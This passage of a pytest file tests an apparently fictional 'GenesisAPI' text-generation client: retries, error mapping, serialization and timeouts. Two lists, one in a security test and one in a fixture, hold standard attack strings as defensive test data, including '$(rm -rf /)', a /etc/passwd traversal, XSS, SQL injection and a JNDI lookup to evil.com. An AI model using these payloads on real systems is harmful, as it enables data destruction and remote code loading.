                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text("Test connection pool")
                assert result.text == "Connection pool response"

    def test_format_genesis_prompt_boundary_values(self):
        """
        Verify that `format_genesis_prompt` handles minimum and maximum allowed values for `max_tokens` and `temperature` when formatting prompts.
        """
        # Test minimum values
        formatted = format_genesis_prompt(
            prompt="A",
            max_tokens=1,
            temperature=0.0
        )
        assert formatted["prompt"] == "A"
        assert formatted["max_tokens"] == 1
        assert formatted["temperature"] == 0.0
        
        # Test maximum values
        formatted = format_genesis_prompt(
            prompt="Test prompt",
            max_tokens=4096,
            temperature=1.0
        )
        assert formatted["max_tokens"] == 4096
        assert formatted["temperature"] == 1.0

    def test_parse_genesis_response_with_optional_fields(self):
        """
        Tests that `parse_genesis_response` correctly handles responses with only required fields as well as those containing additional optional or unexpected fields.
        
        Verifies that missing optional fields are set to appropriate defaults and that extra fields do not cause parsing errors.
        """
        # Response with minimal required fields
        minimal_response = {
            "id": "minimal_id",
            "text": "Minimal response",
            "model": "genesis-v1"
        }
        
        result = parse_genesis_response(minimal_response)
        assert result.id == "minimal_id"
        assert result.text == "Minimal response"
        assert result.model == "genesis-v1"
        assert result.created is None
        assert result.usage == {}
        
        # Response with all fields
        complete_response = {
            "id": "complete_id",
            "text": "Complete response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20},
            "metadata": {"custom_field": "value"}
        }
        
        result = parse_genesis_response(complete_response)
        assert result.created == 1234567890
        assert result.usage["prompt_tokens"] == 10
        assert hasattr(result, 'metadata') or True  # Handle extra fields gracefully

    @pytest.mark.asyncio
    async def test_retry_with_jitter_and_backoff_variations(self):
        """
        Tests that retry logic with exponential backoff and jitter correctly retries a failing asynchronous function on transient server errors and succeeds after multiple failures.
        
        Simulates repeated server errors followed by a successful response, verifying the function is retried the expected number of times and that backoff delays are applied.
        """
        mock_func = AsyncMock()
        
        # Test with increasing failure then success
        mock_func.side_effect = [
            GenesisAPIServerError("Server error 1"),
            GenesisAPIServerError("Server error 2"),
            GenesisAPIServerError("Server error 3"),
            "Success after multiple retries"
        ]
        
        with patch('asyncio.sleep') as mock_sleep:
            result = await retry_with_exponential_backoff(mock_func, max_retries=4)
            assert result == "Success after multiple retries"
            assert mock_func.call_count == 4
            # Verify exponential backoff was called
            assert mock_sleep.call_count == 3

    def test_genesis_request_immutability_and_copying(self):
        """
        Test that GenesisRequest objects are immutable and can be safely copied via dictionary conversion.
        
        Ensures that modifying a dictionary created from a GenesisRequest does not affect the original instance, and that new instances can be created from modified dictionaries without altering the original object.
        """
        original_request = GenesisRequest(
            prompt="Original prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        # Test that modifying dict doesn't affect original
        request_dict = original_request.to_dict()
        request_dict["prompt"] = "Modified prompt"
        
        assert original_request.prompt == "Original prompt"  # Should be unchanged
        
        # Test creating new request from modified dict
        modified_request = GenesisRequest.from_dict(request_dict)
        assert modified_request.prompt == "Modified prompt"
        assert original_request.prompt == "Original prompt"

    def test_genesis_response_timestamp_handling(self):
        """
        Tests that `GenesisResponse` preserves the `created` timestamp field and that it can be accurately converted to a UTC datetime object.
        """
        current_timestamp = int(datetime.now(timezone.utc).timestamp())
        
        response = GenesisResponse(
            id="timestamp_test_id",
            text="Timestamp test",
            model="genesis-v1",
            created=current_timestamp,
            usage={"prompt_tokens": 5, "completion_tokens": 10}
        )
        
        # Test timestamp is preserved correctly
        assert response.created == current_timestamp
        
        # Test converting to datetime if needed
        response_datetime = datetime.fromtimestamp(response.created, tz=timezone.utc)
        assert isinstance(response_datetime, datetime)

    @pytest.mark.asyncio
    async def test_error_recovery_and_graceful_degradation(self):
        """
        Verifies that the GenesisAPI client raises a GenesisAPIServerError and retains error details when a 503 Service Unavailable response is received, ensuring graceful degradation during partial service outages.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Test partial service availability
            mock_post.return_value.__aenter__.return_value.status = 503
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Service partially unavailable", "details": "Model temporarily down"}
            )
            
            with pytest.raises(GenesisAPIServerError) as exc_info:
                await genesis_api.generate_text("Test graceful degradation")
            
            assert "Service partially unavailable" in str(exc_info.value)

    def test_exception_hierarchy_and_inheritance(self):
        """
        Tests that all custom GenesisAPI exceptions inherit from both GenesisAPIError and Exception.
        """
        # Test that all custom exceptions inherit from GenesisAPIError
        auth_error = GenesisAPIAuthenticationError("Auth test")
        rate_limit_error = GenesisAPIRateLimitError("Rate limit test")
        server_error = GenesisAPIServerError("Server test")
        timeout_error = GenesisAPITimeoutError("Timeout test")
        
        assert isinstance(auth_error, GenesisAPIError)
        assert isinstance(rate_limit_error, GenesisAPIError)
        assert isinstance(server_error, GenesisAPIError)
        assert isinstance(timeout_error, GenesisAPIError)
        
        # Test that they're all Exception subclasses
        assert isinstance(auth_error, Exception)
        assert isinstance(rate_limit_error, Exception)
        assert isinstance(server_error, Exception)
        assert isinstance(timeout_error, Exception)

    @pytest.mark.asyncio
    async def test_request_cancellation_handling(self):
        """
        Tests that cancelling an in-progress text generation request with GenesisAPI raises asyncio.CancelledError.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate a long-running request that gets cancelled
            async def slow_request(*args, **kwargs):
                """
                Simulates a slow asynchronous request by waiting for 10 seconds before returning a mock result.
                
                Returns:
                    MagicMock: A mock object representing the simulated request result.
                """
                await asyncio.sleep(10)  # Simulate slow request
                return MagicMock()
            
            mock_post.side_effect = slow_request
            
            # Start request and cancel it quickly
            task = asyncio.create_task(genesis_api.generate_text("Long running prompt"))
            await asyncio.sleep(0.1)  # Let it start
            task.cancel()
            
            with pytest.raises(asyncio.CancelledError):
                await task

    @pytest.mark.asyncio
    async def test_malformed_response_structure_variants(self):
        """
        Test that GenesisAPI raises GenesisAPIError when the API returns malformed response structures.
        
        This includes cases where required fields in the response are missing, empty, or set to None.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        malformed_responses = [
            {"text": "Missing id and model"},
            {"id": "test", "model": "genesis-v1"},  # Missing text
            {"id": "test", "text": "test", "model": None},  # Null model
            {"id": "", "text": "test", "model": "genesis-v1"},  # Empty id
            {"id": "test", "text": "", "model": "genesis-v1"},  # Empty text
            {"id": "test", "text": "test", "model": "genesis-v1", "usage": None},  # Null usage
        ]
        
        for response_data in malformed_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_data)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                with pytest.raises(GenesisAPIError):
                    await genesis_api.generate_text("Test malformed response")

    def test_configuration_validation_comprehensive(self):
        """
        Verify that GenesisAPI raises ValueError when initialized with invalid configuration parameters such as negative or zero timeouts, negative retry counts, or malformed base URLs.
        """
        # Test invalid timeout values
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, timeout=-1)
        
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, timeout=0)
        
        # Test invalid max_retries values
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, max_retries=-1)
        
        # Test URL validation
        invalid_urls = [
            "not_a_url",
            "ftp://invalid.com",
            "http://",
            "https://",
            "",
            None
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                GenesisAPI(api_key=self.api_key, base_url=url)

    @pytest.mark.asyncio
    async def test_response_size_limits_and_handling(self):
        """
        Test that the API client correctly handles and parses extremely large response payloads.
        
        Verifies that a 1MB text response from the `generate_text` method is processed without errors and the full content is accessible.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        # Simulate extremely large response
        huge_text = "x" * 1000000  # 1MB of text
        
        mock_response = {
            "id": "huge_response_id",
            "text": huge_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 1000000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle large responses gracefully
            result = await genesis_api.generate_text("Generate huge response")
            assert len(result.text) == 1000000


class TestGenesisAPISecurityAndValidation:
    """Security and validation focused tests."""
    
    def test_input_sanitization_and_injection_prevention(self):
        """
        Verifies that prompt formatting does not alter potentially malicious input and that API key validation correctly rejects unsafe values.
        """
        potentially_malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(rm -rf /)",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02",  # Null bytes and control characters
        ]
        
        for malicious_input in potentially_malicious_inputs:
            # Should not raise exceptions during formatting
            formatted = format_genesis_prompt(malicious_input)
            assert formatted["prompt"] == malicious_input  # Should be preserved as-is
            
            # API key validation should reject malicious content
            assert validate_api_key(malicious_input) == False

    def test_rate_limiting_headers_parsing(self):
        """
        Verify that rate limiting errors result in exceptions that correctly parse and include relevant rate limiting headers.
        """
        rate_limit_scenarios = [
            (429, {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "1234567890"}),
            (429, {"Retry-After": "60"}),
            (429, {"X-RateLimit-Limit": "1000", "X-RateLimit-Window": "3600"}),
        ]
        
        for status_code, headers in rate_limit_scenarios:
            # Test that rate limit error includes header information
            with pytest.raises(GenesisAPIRateLimitError):
                handle_genesis_error(status_code, {"error": "Rate limited"})

    @pytest.mark.asyncio
    async def test_ssl_and_certificate_validation(self):
        """
        Tests that SSL/TLS certificate validation errors during API requests result in a GenesisAPIError being raised.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate SSL certificate error
            mock_post.side_effect = aiohttp.ClientSSLError("SSL certificate verification failed")
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test SSL validation")


class TestGenesisAPIObservabilityAndDebugging:
    """Tests for observability, logging, and debugging features."""
    
    @pytest.mark.asyncio
    async def test_request_response_logging(self):
        """
        Tests that request and response logging is performed during a text generation API call, ensuring log messages are generated for debugging.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "logged_id",
            "text": "Logged response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with patch('logging.getLogger') as mock_logger:
                logger_instance = MagicMock()
                mock_logger.return_value = logger_instance
                
                await genesis_api.generate_text("Test logging")
                
                # Verify that appropriate log calls were made
                assert logger_instance.debug.called or logger_instance.info.called

    def test_error_context_preservation(self):
        """
        Tests that exceptions from `handle_genesis_error` include detailed error context in their messages for debugging purposes.
        """
        error_scenarios = [
            (401, {"error": "Invalid API key", "error_code": "AUTH_001"}),
            (429, {"error": "Rate limit exceeded", "retry_after": 60}),
            (500, {"error": "Internal server error", "trace_id": "abc123"}),
        ]
        
        for status_code, error_data in error_scenarios:
            try:
                handle_genesis_error(status_code, error_data)
                assert False, "Should have raised an exception"
            except GenesisAPIError as e:
                # Verify error message contains useful debugging information
                error_message = str(e)
                assert "error" in error_message.lower()

    @pytest.mark.asyncio
    async def test_performance_metrics_collection(self):
        """
        Tests that performance metrics, including request duration and token usage, are collected and accessible after a text generation API call.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "metrics_id",
            "text": "Metrics response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            result = await genesis_api.generate_text("Collect metrics")
            end_time = datetime.now()
            
            # Verify timing metrics can be calculated
            duration = (end_time - start_time).total_seconds()
            assert duration >= 0
            assert result.usage["prompt_tokens"] == 10
            assert result.usage["completion_tokens"] == 20


# Additional fixtures for the new tests
@pytest.fixture
def malformed_response_data():
    """
    Return a list of malformed response dictionaries to test error handling during GenesisResponse parsing.
    
    Returns:
        List[dict]: Malformed response data with missing fields, null values, or invalid types.
    """
    return [
        {},  # Empty response
        {"id": "test"},  # Missing required fields
        {"text": None},  # Null values
        {"id": "test", "text": "test", "model": "genesis-v1", "usage": "invalid"},  # Invalid usage type
    ]


@pytest.fixture
def security_test_inputs():
    """
    Return a list of strings representing common security threat payloads for use in security-related tests.
    
    Returns:
        List of strings simulating SQL injection, XSS, path traversal, command injection, template injection, and LDAP injection attacks.
    """
    return [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "$(rm -rf /)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
    ]


@pytest.fixture
def performance_test_config():
    """
    Return a dictionary of configuration parameters for performance tests.
    
    Returns:
        dict: Contains 'large_batch_size', 'response_time_threshold', 'memory_threshold_mb', and 'concurrent_requests' for use in performance testing scenarios.
    """
    return {
        "large_batch_size": 100,
        "response_time_threshold": 5.0,
        "memory_threshold_mb": 100,
        "concurrent_requests": 20
    }


# Parameterized tests for comprehensive coverage
@pytest.mark.parametrize("invalid_temp", [-0.1, 1.1, 2.0, -1.0, 1.5])
def test_temperature_validation_parameterized(invalid_temp):
    """
    Test that providing an invalid temperature value to `format_genesis_prompt` raises a ValueError.
    
    Parameters:
        invalid_temp: A temperature value outside the valid range for prompt formatting.
    """
    with pytest.raises(ValueError):
        format_genesis_prompt("Test prompt", temperature=invalid_temp)


@pytest.mark.parametrize("invalid_tokens", [-1, 0, 10000, -100])
def test_max_tokens_validation_parameterized(invalid_tokens):
    """
    Tests that providing invalid values for `max_tokens` to `format_genesis_prompt` raises a ValueError.
    
    Parameters:
        invalid_tokens: An invalid value for the `max_tokens` parameter to be tested.
    """
    with pytest.raises(ValueError):
        format_genesis_prompt("Test prompt", max_tokens=invalid_tokens)


@pytest.mark.parametrize("status_code,expected_exception", [
    (400, GenesisAPIError),
    (401, GenesisAPIAuthenticationError),
    (403, GenesisAPIAuthenticationError),
    (404, GenesisAPIError),
    (429, GenesisAPIRateLimitError),
    (500, GenesisAPIServerError),
    (502, GenesisAPIServerError),
    (503, GenesisAPIServerError),
])
def test_error_handling_parameterized(status_code, expected_exception):
    """
    Verifies that `handle_genesis_error` raises the expected exception for a specific HTTP status code.
    
    Parameters:
        status_code (int): HTTP status code to simulate.
        expected_exception (Exception): Exception type expected to be raised for the given status code.
    """
    with pytest.raises(expected_exception):
        handle_genesis_error(status_code, {"error": f"Error {status_code}"})

class TestGenesisAPIAdvancedEdgeCases:
    """Additional edge case tests for comprehensive coverage."""
    
    def setup_method(self):
        """
        Initializes a GenesisAPI instance with test credentials for advanced edge case tests.
        """
        self.api_key = "test_api_key_edge_cases"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_generate_text_with_special_characters_in_prompt(self):
        """
        Asynchronously tests that the GenesisAPI correctly handles prompts containing various special characters, ensuring the prompt is transmitted unchanged and the response is parsed as expected.
        """
        special_prompts = [
            "Test with newlines\n\nand tabs\t\there",
            "Test with quotes 'single' and \"double\"",
            "Test with backslashes \\ and forward slashes /",
            "Test with unicode: é, ñ, 中文, русский, العربية",
            "Test with emojis: 😀🎉🚀💡",
            "Test with mathematical symbols: ∑, ∞, ≤, ≥, ∂",
            "Test with markup-like content: <tag>content</tag>",
            "Test with JSON-like: {\"key\": \"value\", \"number\": 42}",
            "Test with code: def func(): return 'hello'",
            "Test with URLs: https://example.com/path?param=value",
        ]
        
        mock_response = {
            "id": "special_chars_id",
            "text": "Response with special handling",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 20, "completion_tokens": 15}
        }
        
        for prompt in special_prompts:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await self.genesis_api.generate_text(prompt)
                assert result.text == "Response with special handling"
                
                # Verify the prompt was passed correctly
                call_args = mock_post.call_args
                assert call_args[1]['json']['prompt'] == prompt

    @pytest.mark.asyncio
    async def test_generate_text_with_binary_content_rejection(self):
        """
        Test that passing binary content as a prompt to `generate_text` raises a TypeError.
        """
        binary_content = b'\x00\x01\x02\xff\xfe\xfd'
        
        with pytest.raises(TypeError):
            await self.genesis_api.generate_text(binary_content)

    @pytest.mark.asyncio
    async def test_generate_text_with_extremely_nested_data_structures(self):
        """
        Test that the API correctly processes requests with extremely nested parameter structures.
        
        Verifies that complex nested dictionaries and lists in the `custom_params` argument are accepted and handled without error, and that a valid response is returned.
        """
        complex_params = {
            "nested": {
                "deep": {
                    "structure": [1, 2, {"inner": "value"}]
                }
            }
        }
        
        mock_response = {
            "id": "nested_test_id",
            "text": "Nested structure response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test that complex parameters are handled appropriately
            result = await self.genesis_api.generate_text(
                "Test prompt",
                custom_params=complex_params
            )
            assert result.text == "Nested structure response"

    @pytest.mark.asyncio
    async def test_api_response_with_unexpected_additional_fields(self):
        """
        Test that the API client correctly processes responses containing unexpected additional fields.
        
        Verifies that extra fields in the API response do not affect parsing of required fields and that the response is handled gracefully.
        """
        response_with_extra_fields = {
            "id": "extra_fields_id",
            "text": "Response with extra fields",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20},
            "experimental_field": "unexpected_value",
            "metadata": {
                "version": "1.2.3",
                "build": "abc123",
                "features": ["feature1", "feature2"]
            },
            "statistics": {
                "processing_time": 0.5,
                "queue_time": 0.1
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_with_extra_fields)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Test extra fields")
            assert result.text == "Response with extra fields"
            assert result.usage["prompt_tokens"] == 10

    @pytest.mark.asyncio
    async def test_api_timeout_with_partial_response(self):
        """
        Test that a timeout occurring during partial response reading raises a GenesisAPITimeoutError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate timeout during response reading
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=asyncio.TimeoutError("Response reading timeout")
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPITimeoutError):
                await self.genesis_api.generate_text("Test partial timeout")

    @pytest.mark.asyncio
    async def test_concurrent_requests_with_mixed_outcomes(self):
        """
        Tests handling of multiple concurrent API requests where some succeed and others fail, verifying that successful responses and raised exceptions are correctly distinguished and counted.
        """
        success_response = {
            "id": "success_id",
            "text": "Success response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Mix of success and various failure responses
            mock_responses = [
                (200, success_response),
                (429, {"error": "Rate limit"}),
                (500, {"error": "Server error"}),
                (200, success_response),
                (401, {"error": "Auth error"}),
            ]
            
            async def mock_response_generator(*args, **kwargs):
                """
                Asynchronously returns a mocked HTTP response object with a specified status and JSON payload.
                
                Removes and uses the next (status, response_data) tuple from the `mock_responses` list to configure the mock response.
                """
                status, response_data = mock_responses.pop(0)
                mock_resp = AsyncMock()
                mock_resp.status = status
                mock_resp.json = AsyncMock(return_value=response_data)
                return mock_resp
            
            mock_post.return_value.__aenter__.side_effect = mock_response_generator
            
            tasks = [
                self.genesis_api.generate_text(f"Concurrent test {i}")
                for i in range(5)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Check that we got a mix of successes and exceptions
            successes = [r for r in results if isinstance(r, GenesisResponse)]
            exceptions = [r for r in results if isinstance(r, Exception)]
            
            assert len(successes) == 2  # Two successful responses
            assert len(exceptions) == 3  # Three different types of errors

    def test_genesis_request_deep_copy_behavior(self):
        """
        Verify that deep copying a GenesisRequest object creates an independent copy, including nested data structures, such that modifications to the copy do not affect the original.
        """
        import copy
        
        original = GenesisRequest(
            prompt="Original prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7,
            custom_data={"nested": {"value": 42}}
        )
        
        # Test deep copy
        copied = copy.deepcopy(original)
        assert copied.prompt == original.prompt
        assert copied.model == original.model
        assert copied.max_tokens == original.max_tokens
        assert copied.temperature == original.temperature
        
        # Verify it's a true deep copy (modifying copy doesn't affect original)
        if hasattr(copied, 'custom_data'):
            copied.custom_data["nested"]["value"] = 999
            assert original.custom_data["nested"]["value"] == 42

    def test_genesis_response_string_representation(self):
        """
        Verifies that the string and repr representations of GenesisResponse include key identifying information.
        """
        response = GenesisResponse(
            id="repr_test_id",
            text="Test response for string representation",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 15, "completion_tokens": 25}
        )
        
        response_str = str(response)
        assert "repr_test_id" in response_str
        assert "genesis-v1" in response_str
        
        # Test repr as well
        response_repr = repr(response)
        assert "GenesisResponse" in response_repr
        assert "repr_test_id" in response_repr

    @pytest.mark.asyncio
    async def test_api_with_custom_user_agent_headers(self):
        """
        Tests that API calls include custom user agent and additional headers, and verifies the response is correctly handled.
        """
        custom_headers = {
            "User-Agent": "TestClient/1.0",
            "X-Custom-Header": "custom_value",
            "Accept": "application/json"
        }
        
        genesis_api = GenesisAPI(
            api_key=self.api_key,
            base_url=self.base_url,
            custom_headers=custom_headers
        )
        
        mock_response = {
            "id": "custom_headers_id",
            "text": "Custom headers response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await genesis_api.generate_text("Test custom headers")
            assert result.text == "Custom headers response"
            
            # Verify custom headers were included
            call_args = mock_post.call_args
            if 'headers' in call_args[1]:
                headers = call_args[1]['headers']
                assert headers.get("User-Agent") == "TestClient/1.0"
                assert headers.get("X-Custom-Header") == "custom_value"

    @pytest.mark.asyncio
    async def test_request_id_correlation_across_retries(self):
        """
        Verify that the same request ID is maintained and returned across retry attempts during transient API failures.
        
        This test simulates a transient server error followed by a successful response, ensuring that the request ID remains consistent throughout retries.
        """
        original_request_id = str(uuid.uuid4())
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # First attempt fails, second succeeds
            mock_responses = [
                (503, {"error": "Service unavailable"}),
                (200, {
                    "id": original_request_id,
                    "text": "Retry success",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                })
            ]
            
            response_iterator = iter(mock_responses)
            
            async def mock_response_generator(*args, **kwargs):
                """
                Asynchronously generates a mocked HTTP response using the next status and data from a response iterator.
                
                Returns:
                    AsyncMock: A mock response object with predefined status and JSON payload.
                """
                status, response_data = next(response_iterator)
                mock_resp = AsyncMock()
                mock_resp.status = status
                mock_resp.json = AsyncMock(return_value=response_data)
                return mock_resp
            
            mock_post.return_value.__aenter__.side_effect = mock_response_generator
            
            with patch('asyncio.sleep'):  # Speed up retry delays
                result = await self.genesis_api.generate_text("Test retry correlation")
                assert result.id == original_request_id
                assert result.text == "Retry success"

    def test_error_message_formatting_and_localization(self):
        """
        Tests that error messages produced by `handle_genesis_error` include relevant error codes, descriptions, and additional context, ensuring proper formatting and support for localization or detailed error information.
        """
        error_scenarios = [
            {
                "status": 401,
                "error_data": {
                    "error": "Invalid API key",
                    "error_code": "AUTH_001",
                    "message": "The provided API key is invalid or expired",
                    "documentation_url": "https://docs.genesis.com/errors#AUTH_001"
                }
            },
            {
                "status": 429,
                "error_data": {
                    "error": "Rate limit exceeded",
                    "error_code": "RATE_001",
                    "message": "You have exceeded your rate limit. Please try again later.",
                    "retry_after": 60,
                    "limit": 100,
                    "window": 3600
                }
            },
            {
                "status": 500,
                "error_data": {
                    "error": "Internal server error",
                    "error_code": "INTERNAL_001",
                    "message": "An unexpected error occurred. Please try again.",
                    "trace_id": "abc123def456"
                }
            }
        ]
        
        for scenario in error_scenarios:
            try:
                handle_genesis_error(scenario["status"], scenario["error_data"])
                assert False, "Expected exception to be raised"
            except GenesisAPIError as e:
                error_message = str(e)
                # Verify error message contains useful information
                assert len(error_message) > 0
                # Check for presence of key error information
                if "error_code" in scenario["error_data"]:
                    assert scenario["error_data"]["error_code"] in error_message or \
                           scenario["error_data"]["error"] in error_message


class TestGenesisAPIDataValidationAndSerialization:
    """Tests for data validation and serialization edge cases."""
    
    def test_genesis_request_with_none_values(self):
        """
        Test that GenesisRequest raises ValueError for None in required fields and correctly handles None in optional fields by applying defaults.
        """
        # Test that None values are handled appropriately
        with pytest.raises(ValueError):
            GenesisRequest(prompt=None, model="genesis-v1")
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model=None)
        
        # Test that None values in optional fields are handled
        request = GenesisRequest(
            prompt="Test",
            model="genesis-v1",
            max_tokens=None,  # Should use default
            temperature=None  # Should use default
        )
        assert request.prompt == "Test"
        assert request.model == "genesis-v1"

    def test_genesis_response_with_missing_optional_fields(self):
        """
        Verifies that GenesisResponse can be instantiated when optional fields are missing or partially provided, and that defaults are correctly applied.
        """
        # Test minimal response
        minimal_response = GenesisResponse(
            id="minimal_id",
            text="Minimal text",
            model="genesis-v1"
        )
        assert minimal_response.id == "minimal_id"
        assert minimal_response.text == "Minimal text"
        assert minimal_response.model == "genesis-v1"
        assert minimal_response.created is None
        assert minimal_response.usage == {}
        
        # Test response with partial optional fields
        partial_response = GenesisResponse(
            id="partial_id",
            text="Partial text",
            model="genesis-v1",
            created=1234567890
        )
        assert partial_response.created == 1234567890
        assert partial_response.usage == {}

    def test_json_serialization_round_trip(self):
        """
        Verifies that a GenesisRequest object can be serialized to JSON and deserialized back without data loss.
        """
        original_request = GenesisRequest(
            prompt="Serialization test",
            model="genesis-v1",
            max_tokens=200,
            temperature=0.8
        )
        
        # Convert to dict, then to JSON, then back
        request_dict = original_request.to_dict()
        json_str = json.dumps(request_dict)
        parsed_dict = json.loads(json_str)
        reconstructed_request = GenesisRequest.from_dict(parsed_dict)
        
        assert reconstructed_request.prompt == original_request.prompt
        assert reconstructed_request.model == original_request.model
        assert reconstructed_request.max_tokens == original_request.max_tokens
        assert reconstructed_request.temperature == original_request.temperature

    def test_unicode_handling_in_serialization(self):
        """
        Verify that Unicode characters are preserved during serialization and deserialization of a GenesisRequest.
        """
        unicode_text = "Test with Unicode: 你好世界 🌍 café naïve résumé"
        
        request = GenesisRequest(
            prompt=unicode_text,
            model="genesis-v1",
            max_tokens=100
        )
        
        # Test serialization preserves Unicode
        serialized = request.to_dict()
        assert serialized["prompt"] == unicode_text
        
        # Test deserialization preserves Unicode
        reconstructed = GenesisRequest.from_dict(serialized)
        assert reconstructed.prompt == unicode_text

    def test_large_numerical_values_handling(self):
        """
        Test that GenesisResponse correctly handles and preserves large numerical values in usage statistics.
        """
        large_usage = {
            "prompt_tokens": 999999999,
            "completion_tokens": 888888888,
            "total_tokens": 1888888887
        }
        
        response = GenesisResponse(
            id="large_numbers_id",
            text="Large numbers test",
            model="genesis-v1",
            created=1234567890,
            usage=large_usage
        )
        
        assert response.usage["prompt_tokens"] == 999999999
        assert response.usage["completion_tokens"] == 888888888
        assert response.usage["total_tokens"] == 1888888887

    def test_floating_point_precision_in_temperature(self):
        """
        Tests that the `GenesisRequest` correctly preserves floating point precision for temperature values.
        """
        precision_values = [0.0, 0.1, 0.12345, 0.999999, 1.0]
        
        for temp in precision_values:
            request = GenesisRequest(
                prompt="Precision test",
                model="genesis-v1",
                temperature=temp
            )
            assert abs(request.temperature - temp) < 1e-10  # Allow for floating point precision

    def test_date_time_edge_cases_in_response(self):
        """
        Tests handling of edge case timestamp values in the `created` field of `GenesisResponse`, ensuring correct storage and conversion to `datetime` objects.
        """
        edge_case_timestamps = [
            0,  # Unix epoch
            1234567890,  # Common test timestamp
            2147483647,  # Max 32-bit signed integer
            253402300799,  # Year 9999
        ]
        
        for timestamp in edge_case_timestamps:
            response = GenesisResponse(
                id="datetime_test_id",
                text="DateTime test",
                model="genesis-v1",
                created=timestamp
            )
            assert response.created == timestamp
            
            # Test that timestamp can be converted to datetime
            if timestamp > 0:
                dt = datetime.fromtimestamp(timestamp, tz=timezone.utc)
                assert isinstance(dt, datetime)


class TestGenesisAPIStateAndLifecycle:
    """Tests for API state management and lifecycle."""
    
    def setup_method(self):
        """
        Initializes the API key and base URL for lifecycle-related tests.
        """
        self.api_key = "lifecycle_test_key"
        self.base_url = "https://api.genesis.example.com"

    def test_api_instance_immutability(self):
        """
